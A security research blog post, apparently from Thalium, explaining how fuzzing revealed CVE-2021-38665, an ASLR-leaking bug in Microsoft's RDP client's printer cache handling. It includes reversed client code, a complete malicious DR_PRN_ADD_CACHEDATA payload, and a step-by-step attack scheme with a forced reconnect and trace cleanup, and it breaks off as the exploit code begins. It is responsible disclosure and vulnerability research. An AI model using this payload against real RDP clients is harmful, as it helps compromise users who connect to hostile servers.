<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=author content="Thalium Team"><meta name=description content="Thalium blog."><meta name=keywords content="blog,tech"><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><meta name=generator content="Hugo 0.113.0"><link rel=canonical href=/posts/leaking-aslr-through-rdp-printer-cache-registry/><meta property="og:title" content="Remote ASLR Leak in Microsoft's RDP Client through Printer Cache Registry (CVE-2021-38665)"><meta property="og:description" content="This is the second installment in my three-part series of articles on fuzzing Microsoft&rsquo;s RDP client. I will explain a bug I found by fuzzing the printer sub-protocol, and how I exploited it."><meta property="og:type" content="article"><meta property="og:url" content="/posts/leaking-aslr-through-rdp-printer-cache-registry/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-12-10T06:00:00+01:00"><meta property="article:modified_time" content="2021-12-10T06:00:00+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Remote ASLR Leak in Microsoft's RDP Client through Printer Cache Registry (CVE-2021-38665)"><meta name=twitter:description content="This is the second installment in my three-part series of articles on fuzzing Microsoft&rsquo;s RDP client. I will explain a bug I found by fuzzing the printer sub-protocol, and how I exploited it."><meta itemprop=name content="Remote ASLR Leak in Microsoft's RDP Client through Printer Cache Registry (CVE-2021-38665)"><meta itemprop=description content="This is the second installment in my three-part series of articles on fuzzing Microsoft&rsquo;s RDP client. I will explain a bug I found by fuzzing the printer sub-protocol, and how I exploited it."><meta itemprop=datePublished content="2021-12-10T06:00:00+01:00"><meta itemprop=dateModified content="2021-12-10T06:00:00+01:00"><meta itemprop=wordCount content="3611"><meta itemprop=keywords content="RDP,Exploit,CVE,Vulnerability Research,ASLR,"><link rel=stylesheet href=/css/layout.css><link rel=stylesheet href=/css/default-dark.css><link rel=icon href=/favicon.ico><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-141692648-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><title>Remote ASLR Leak in Microsoft's RDP Client through Printer Cache Registry (CVE-2021-38665)</title><script>MathJax={tex:{inlineMath:[["∳","∳"]],displayMath:[["∳∳","∳∳"]],processEscapes:!0},svg:{fontCache:"global"}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js></script></head><body><style>@font-face{font-family:days_one;src:url(/days_one.ttf)format('truetype')}.siteTitle{margin-top:24px}.siteTitle img{display:inline-block;vertical-align:middle;margin-top:-24px;margin-right:-10px}.siteTitle span{font-family:days_one,Fallback,sans-serif;color:#fff;font-size:160%}</style><div class=main><header><div class=header-bar><nav><div class=siteTitle><a href=/><img src=/shard_only_no_background.png width=12%></img>
<span>THALIUM</span></a></div><a class=nav-item href=/posts/><div class=nav-item-title>Posts</div></a><a class=nav-item href=/joinus/><div class=nav-item-title>Join Us</div></a><a class=nav-item href=/about/><div class=nav-item-title>About</div></a></nav><div class=social-links-header><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>Github</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div></div></header><article class=post><h1 class=title>Remote ASLR Leak in Microsoft's RDP Client through Printer Cache Registry (CVE-2021-38665)</h1><div class=content><p>This is the <strong>second installment</strong> in my three-part series of articles on fuzzing Microsoft&rsquo;s RDP client. I will explain a bug I found by fuzzing the <strong>printer sub-protocol</strong>, and how I exploited it.</p><ul><li><a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38665>MSRC Report: RDP Client Information Disclosure Vulnerability (CVE-2021-38665)</a></li><li>CVSS 7.4 (Important)</li></ul><p>Other articles in this series:</p><ul><li><a href=/posts/fuzzing-microsoft-rdp-client-using-virtual-channels/>Fuzzing Microsoft&rsquo;s RDP Client using Virtual Channels: Overview & Methodology</a></li><li><a href=/posts/leaking-aslr-through-rdp-printer-cache-registry/>Remote ASLR Leak in Microsoft&rsquo;s RDP Client through Printer Cache Registry (CVE-2021-38665)</a></li><li><a href=/posts/deserialization-bug-through-rdp-smart-card-extension/>Remote Deserialization Bug in Microsoft&rsquo;s RDP Client through Smart Card Extension (CVE-2021-38666)</a></li></ul><h2 id=table-of-contents>Table of Contents</h2><ul><li><a href=#introduction>Introduction</a></li><li><a href=#fuzzing-rdpdr-the-file-system-virtual-channel-extension>Fuzzing RDPDR, the <em>File System Virtual Channel Extension</em></a></li><li><a href=#strange-registry-shenanigans>Strange registry shenanigans</a></li><li><a href=#leaking-heap-through-the-client-registry>Leaking heap through the client registry</a></li><li><a href=#getting-the-leak-back-to-the-server>Getting the leak back to the server</a></li><li><a href=#building-the-exploit>Building the exploit</a></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#disclosure-timeline>Disclosure Timeline</a></li><li><a href=#full-proof-of-concept-source-code>Full Proof-of-Concept source code</a></li></ul><h1 id=introduction>Introduction</h1><p>The <strong>Remote Desktop Protocol (RDP)</strong> is a proprietary protocol designed by Microsoft which allows the user of an <em>RDP client software</em> to connect to a remote computer over the network with a graphical interface. Its use around the world is very widespread; some people, for instance, use it often for remote work and administration.</p><p>Most of vulnerability research is concentrated on the RDP <em>server</em>. However, some critical vulnerabilities have also been found in the past in the RDP <em>client</em>, which would allow a compromised server to attack a client that connects to it.</p><p>At Blackhat Europe 2019, a team of researchers showed they <a href=https://www.unexploitable.systems/papers/park:rdpfuzzing-slides.pdf>found an RCE</a> in the RDP client. Their motivation was that North Korean hackers would alledgely carry out attacks through RDP servers acting as proxies, and that you could hack them back by setting up a malicious RDP server to which they would connect.</p><p>During my internship at Thalium, I spent time studying and reverse engineering Microsoft RDP, learning about fuzzing, and looking for vulnerabilities.</p><p>In this article, I will explain how I found and exploited a vulnerability in the Microsoft RDP client that allows to leak some remote heap and break the client ASLR. It is not the most convoluted of bugs, nor the most spectacular, but I think it is kind of amusing.</p><p>If you are interested in details about the <strong>Remote Desktop Protocol</strong>, <strong>reversing</strong> the Microsoft RDP client or <strong>fuzzing</strong> methodology, I invite you to read <strong><a href=/posts/fuzzing-microsoft-rdp-client-using-virtual-channels/>my first article</a></strong> which tackles these subjects.</p><p>Either way, I will briefly provide some context required to understand this article:</p><ul><li>The target is Microsoft&rsquo;s official RDP client on Windows 10.</li><li>Executable is <code>mstsc.exe</code> (in system32), but the main DLL for most of the client logic is <code>mstscax.dll</code>.</li><li>RDP uses the abstraction of <strong>virtual channels</strong>, a layer for transporting data.<ul><li>For instance, the channel <code>RDPSND</code> is used for audio redirection, and the channel <code>CLIPRDR</code> is used for clipboard synchronization.</li></ul></li><li>Each channel behaves according to separate logic and its own protocol, which official specification can often be found in Microsoft docs.</li><li>Virtual channels are a great attack surface and a <strong>good entrypoint for fuzzing</strong>.</li><li>I fuzzed virtual channels with a modified version of <strong>WinAFL</strong> and a network-level harness.</li></ul><h1 id=fuzzing-rdpdr-the-file-system-virtual-channel-extension>Fuzzing RDPDR, the <em>File System Virtual Channel Extension</em></h1><p><strong><code>RDPDR</code></strong> is the name of the static virtual channel which purpose is to <strong>redirect access from the server to the client file system</strong>. It is also the base channel that hosts several <strong>sub-extensions</strong> such as the smart card extension, the <strong>printing extension</strong> or the serial/parallel ports extension.</p><p><code>RDPDR</code> is one of the few channels that are <strong>opened by default</strong> in the RDP client, alongside other static channels <code>RDPSND</code>, <code>CLIPRDR</code>, <code>DRDYNVC</code>. This makes it an even more interesting target risk-wise.</p><p>Microsoft has some nice <a href=https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-RDPEFS/%5bMS-RDPEFS%5d.pdf>documentation</a> on this channel. It contains the different PDU types, their structures, and even dozens of examples of PDUs which is great for seeding our fuzzer.</p><p>Fuzzing <code>RDPDR</code> yielded a few small bugs, as well as another bug for which I got a CVE (see my next article: <a href=/posts/deserialization-bug-through-rdp-smart-card-extension/>Remote Deserialization Bug in Microsoft&rsquo;s RDP Client through Smart Card Extension</a>).</p><p>What&rsquo;s interesting though, is that while I found the vulnerability I am going to explain by fuzzing, the <em>crashes</em> WinAFL found were not what led me to discover this bug at all. Rather, it was the prolonged fuzzing and the millions of executions that unveiled <strong>unexpected side effects</strong> the server could have on the client&rsquo;s system.</p><h1 id=strange-registry-shenanigans>Strange registry shenanigans</h1><p>I was heavily fuzzing the RDPDR channel, and at some point my RDP client just broke. Not broke like in crash once and forget about it; everytime I would start the client, it would eat up a stupid amount of memory until eventually hanging the whole system. No reboot or RDP cache clear would help.</p><p>I fired up <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/procmon>Procmon</a>, and noticed an unusually large proportion of the operations performed by the client upon starting were actually <strong>registry operations</strong>. More specifically, it kept iterating on keys inside <code>HKCU\Software\Microsoft\Terminal Server Client\Default\AddIns\RDPDR</code>, and the more keys, the worse the memory consumption.</p><p>This fact alone is already very annoying for a client: it is even worse than a simple crash or arbitrary memory allocation. Since the bug is persistent, it entirely prevents you from using RDP ever again, unless you <em>specifically</em> know how to fix the problem by deleting the correct keys in the registry.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/rdp/procmon-registry-garbage.png target=_blank><img src=/posts/img/rdp/procmon-registry-garbage.png alt="Procmon showing garbage keys being created in the registry"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Procmon showing garbage keys being created in the registry</figcaption></figure></p><p>So are we able to pollute this part of the registry with <strong>arbitrary subkey names</strong>? The answer is yes.</p><p>These names are actually WinAFL mutations, and they are interpreted as UTF-16, hence the many garbage chinese characters.</p><p>I looked for references to registry operations in <code>mstscax.dll</code> and correlated my findings with the <a href=https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-RDPEPC/%5BMS-RDPEPC%5D.pdf><strong>printer subprotocol specification</strong></a>.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/rdp/dr_prn_add_cachedata.png target=_blank><img src=/posts/img/rdp/dr_prn_add_cachedata.png alt="Add Printer Cachedata PDU specification"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Add Printer Cachedata PDU structure from the specification</figcaption></figure></p><p>The PDU type &ldquo;Add Printer Cachedata&rdquo; (<code>DR_PRN_ADD_CACHEDATA</code>) is responsible for creating these registry keys. A bit of reversing will quickly show you that you totally control the key name (<code>PrinterName</code>), and to a certain extent, contents too.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>__int64</span> W32DrPRN<span style=color:#f92672>::</span>AddPrinterCacheInfo(DR_PRN_ADD_CACHEDATA <span style=color:#f92672>*</span> PduBody, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> PduBodyLength)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  DWORD dwDisposition;
</span></span><span style=display:flex><span>  HKEY phkResult, hKey;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// W32DrPRN::_maxCacheDataSize = 500000 bytes
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>if</span> (PduBodyLength <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x18</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>      PduBody<span style=color:#f92672>-&gt;</span>PrintNameLen <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>      PduBody<span style=color:#f92672>-&gt;</span>PnPNameLen <span style=color:#f92672>&gt;</span> W32DrPRN<span style=color:#f92672>::</span>_maxCacheDataSize <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>      PduBody<span style=color:#f92672>-&gt;</span>DriverNameLen <span style=color:#f92672>&gt;</span> W32DrPRN<span style=color:#f92672>::</span>_maxCacheDataSize <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>      PduBody<span style=color:#f92672>-&gt;</span>PrintNameLen <span style=color:#f92672>&gt;</span> W32DrPRN<span style=color:#f92672>::</span>_maxCacheDataSize <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>      PduBody<span style=color:#f92672>-&gt;</span>CachedFieldsLen <span style=color:#f92672>&gt;</span> W32DrPRN<span style=color:#f92672>::</span>_maxCacheDataSize) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Error
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> TotalLen <span style=color:#f92672>=</span> <span style=color:#ae81ff>24</span> <span style=color:#f92672>+</span> PduBody<span style=color:#f92672>-&gt;</span>PnPNameLen <span style=color:#f92672>+</span> PduBody<span style=color:#f92672>-&gt;</span>DriverNameLen <span style=color:#f92672>+</span> PduBody<span style=color:#f92672>-&gt;</span>PrintNameLen <span style=color:#f92672>+</span> PduBody<span style=color:#f92672>-&gt;</span>CachedFieldsLen;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (TotalLen <span style=color:#f92672>&gt;</span> PduBodyLength) { <span style=color:#75715e>/* Error */</span> }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (TotalLen <span style=color:#f92672>&gt;</span> W32DrPRN<span style=color:#f92672>::</span>_maxCacheDataSize) { <span style=color:#75715e>/* Error */</span> }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> WCHAR <span style=color:#f92672>*</span> PrinterName <span style=color:#f92672>=</span> (<span style=color:#66d9ef>const</span> WCHAR <span style=color:#f92672>*</span>)((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)PduBody <span style=color:#f92672>+</span> <span style=color:#ae81ff>24</span> <span style=color:#f92672>+</span> PduBody<span style=color:#f92672>-&gt;</span>PnPNameLen <span style=color:#f92672>+</span> PduBody<span style=color:#f92672>-&gt;</span>DriverNameLen);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  RegCreateKeyExW(
</span></span><span style=display:flex><span>    HKEY_CURRENT_USER,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;Software</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Microsoft</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Terminal Server Client</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Default</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>AddIns</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>RDPDR&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0xF003F</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&amp;</span>hKey,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&amp;</span>dwDisposition
</span></span><span style=display:flex><span>  );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  RegCreateKeyExW(hKey, PrinterName, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0xF003F</span>, <span style=color:#ae81ff>0</span>, <span style=color:#f92672>&amp;</span>phkResult, <span style=color:#f92672>&amp;</span>dwDisposition);
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  RegSetValueExW(phkResult, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;PrinterCacheData&#34;</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>3</span>, (<span style=color:#66d9ef>const</span> BYTE <span style=color:#f92672>*</span>)PduBody, TotalLen);
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>I don&rsquo;t think you can do much damage inside the registry itself with this kind of creation-of-a-subkey-with-arbitrary-name primitive. For instance, there is no such thing as a path traversal attack.</p><p>However, something really bugged me out. Some key names in the registry seemed <strong>longer than usual</strong>, which made me think there could be an issue with <strong>length management</strong>.</p><p>I couldn&rsquo;t find anything as interesting as controlling the size of an out-of-bounds through the different length fields, be it in this PDU type (Add Printer Cachedata) or other ones (Update Printer Cachedata, Rename Printer Cachedata&mldr;).</p><p>Therefore, the bug naturally comes from the fact that the server can send a <strong>non-null-terminated wide string</strong> to the client as the <code>PrinterName</code>. It is naively passed to <code>RegCreateKeyExW</code> (the second one), which will create the key assuming its name stops at the first wide null-byte (two consecutive null bytes).</p><h1 id=leaking-heap-through-the-client-registry>Leaking heap through the client registry</h1><p>Here is an example of a malicious PDU that will trigger the bug:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>char</span> leak_heap[] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>  <span style=color:#75715e>// DR_PRN_ADD_CACHEDATA
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#ae81ff>0x52</span>, <span style=color:#ae81ff>0x50</span>, <span style=color:#ae81ff>0x43</span>, <span style=color:#ae81ff>0x50</span>,                         <span style=color:#75715e>// Header
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,                         <span style=color:#75715e>// EventId
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#ae81ff>0x43</span>, <span style=color:#ae81ff>0x4f</span>, <span style=color:#ae81ff>0x4d</span>, <span style=color:#ae81ff>0x32</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x3a</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#75715e>// PortDosName
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,                         <span style=color:#75715e>// PnpNameLen
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#ae81ff>0x2a</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,                         <span style=color:#75715e>// DriverNameLen
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#ae81ff>0x2a</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,                         <span style=color:#75715e>// PrintNameLen
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,                         <span style=color:#75715e>// CachedFieldsLen
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// DriverName
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#ae81ff>0x42</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x72</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x6f</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x74</span>,
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x68</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x65</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x72</span>, <span style=color:#ae81ff>0x00</span>,
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x44</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x43</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x50</span>,
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x2d</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x31</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x00</span>,
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x55</span>,
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x53</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x42</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,
</span></span><span style=display:flex><span>  <span style=color:#75715e>// PrinterName
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#ae81ff>0x42</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x72</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x6f</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x74</span>,
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x68</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x65</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x72</span>, <span style=color:#ae81ff>0x00</span>,
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x44</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x43</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x50</span>,
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x2d</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x31</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x00</span>,
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x55</span>,
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x53</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x42</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x00</span>,
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>0x61</span>, <span style=color:#ae81ff>0x62</span>, <span style=color:#ae81ff>0x63</span>, <span style=color:#ae81ff>0x64</span>
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>The only thing here that is really important to notice is that the <code>PrinterName</code> field never contains <code>0x00 0x00</code>.</p><p>Upon receiving this PDU from the server on the <code>RDPDR</code> channel, the client will enter <code>W32DrPRN::ProcessPrinterCacheInfo</code> and our message be dispatched to <code>W32DrPRN::AddPrinterCacheInfo</code>.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/rdp/rdpdr_add_printer_cache_graph.png target=_blank><img src=/posts/img/rdp/rdpdr_add_printer_cache_graph.png alt="Path taken by the malicious PDU"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Path taken by the malicious PDU in mstscax.dll</figcaption></figure></p><p>Right before the second call to <code>RegCreateKeyExW</code>, here&rsquo;s what memory at <code>PrinterName</code> can look like:</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/rdp/bug-2021-06-08-A-memory-dump.png target=_blank><img src=/posts/img/rdp/bug-2021-06-08-A-memory-dump.png alt="Heap memory dump at PrinterName"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Heap memory dump at PrinterName</figcaption></figure></p><p>We can see there is extra data after our <code>"abcd"</code> (end of our PrinterName <em>and</em> of our PDU). When this buffer (<code>0x000001352d6ebe6a</code>) is passed to <code>RegCreateKeyExW</code>, it will be copied until the first double null byte is met. Luckily for us, this happens right after an <strong>address leak</strong> (<code>0x7ffbc16092d8</code>).</p><p>We can confirm by taking a look at the registry right after this call!</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/rdp/bug-2021-06-08-A-registry-leak.png target=_blank><img src=/posts/img/rdp/bug-2021-06-08-A-registry-leak.png alt="Leakage inside the registry"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Leakage inside the registry</figcaption></figure></p><p>Let&rsquo;s copy the key name and encode it as UTF-16 (little endian):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#e6db74>&#34;Brother DCP-1000 USB 扡摣⢍透䀀退鋘셠翻&#34;</span><span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-16le&#39;</span>)<span style=color:#f92672>.</span>hex()
</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;420072006f00740068006500720020004400430050002d00310030003000300020005500530042002000616263648d280f9000400090d89260c1fb7f&#39;</span>
</span></span></code></pre></div><p>Our address leak does sit right at the end.</p><p>Some tests in my environments (Windows 10 20H2 / 10.0.19041.844 and Windows 10 Insider Build / 10.0.21354.1) showed we could most of the time leak a few addresses of this kind. They are specific vtable pointers in <code>mstscax.dll</code>, allowing us to retrieve its <strong>base address</strong>.</p><p>You can also probably try some heap spray, for instance by opening a lot of dummy dynamic channels and closing them. Dynamic channel managers that are allocated and freed in the heap contain vtable function pointers.</p><p>But as long as it stays on the client&rsquo;s machine, there&rsquo;s no harm&mldr; right?</p><h1 id=getting-the-leak-back-to-the-server>Getting the leak back to the server</h1><p>We need to find a way to <strong>repatriate the leak</strong> to our server.</p><p>Providentially, the following message type exists, and the client is supposed to send it to the server upon initialization of the <code>RDPDR</code> virtual channel.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/rdp/dr_prn_device_announce.png target=_blank><img src=/posts/img/rdp/dr_prn_device_announce.png alt="Client Device List Announce Request PDU specification"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Client Device List Announce Request PDU structure from the specification</figcaption></figure></p><p>Therefore, if the victim reconnects to the server, the client will iterate on the registry keys we have tampered with and send them to the server, including our leaks.</p><p>We can confirm this easily by setting a breakpoint on <code>VCManager::ChannelWriteEx</code> inside <code>W32ProcObj::PostLogonAnnounceDevicesToServerFunc</code>, and observing <strong>the client does write our leaks to the channel</strong>.</p><p>Two steps now remain:</p><ol><li>Waiting for the client to reconnect (is it necessary?)</li><li>Reading from the virtual channel on the server side</li></ol><p>Waiting for the client to reconnect is not very satisfactory for a few reasons:</p><ul><li>It&rsquo;s better if the victim doesn&rsquo;t have to perform any action.</li><li>There&rsquo;s a decent chance the victim shuts down their computer after their RDP session, which would then make the ASLR leak irrelevant if they reconnect at a later time.</li></ul><p>Now, is there a way to make the client reconnect to the server a bit more seamlessly?</p><p>While I was fuzzing other channels, I noticed that if you sent garbage to the dynamic channel <code>Microsoft::Windows::RDS::Graphics</code> (which transports bitmap data), the client would show this pop-up window and <strong>automatically reconnect</strong>.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/rdp/connection-lost.png target=_blank><img src=/posts/img/rdp/connection-lost.png alt="The connection has been lost&amp;hellip;"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>The connection has been lost&mldr;</figcaption></figure></p><p>Not very subtle or furtive, but it will do for a proof of concept.</p><p>Finally, after the client sends the leak, we can send many &ldquo;Delete Printer Cachedata&rdquo; PDUs (<code>DR_PRN_DELETE_CACHEDATA</code>) to <strong>delete the leaky keys</strong> in the client&rsquo;s registry. This cleans up traces of the attack in it and makes it a bit more stealthy. I will not do it in the POC though, because it requires a bit more effort.</p><p><strong>Let&rsquo;s sum up our current attack scheme:</strong></p><ol><li>Send a malicious <code>DR_PRN_ADD_CACHEDATA</code> message to the client</li><li>The client will leak some heap in a registry key name</li><li>Optionally repeat 1-2 as many times as we want to increase our probability of successfully leaking interesting data</li><li>Trick the client into reconnecting by corrupting the <code>Graphics</code> dynamic channel</li><li>Receive the leaks upon initialization of the <code>RDPDR</code> channel</li><li>Optionally send <code>DR_PRN_DELETE_CACHEDATA</code> PDUs to clean up the client&rsquo;s registry</li></ol><p>We can now build our proof-of-concept exploit!</p><h1 id=building-the-exploit>Building the exploit</h1><p>Microsoft provides a very useful API called <a href=https://docs.microsoft.com/en-us/windows/win32/api/wtsapi32/><strong>WTSAPI32</strong></a> to open a virtual channel over an RDP session, read from it, write to it, etc.</p><p>You can <strong>open a virtual channel</strong> (static or dynamic) this way:</p><div class=highlight><pre tabindex=0 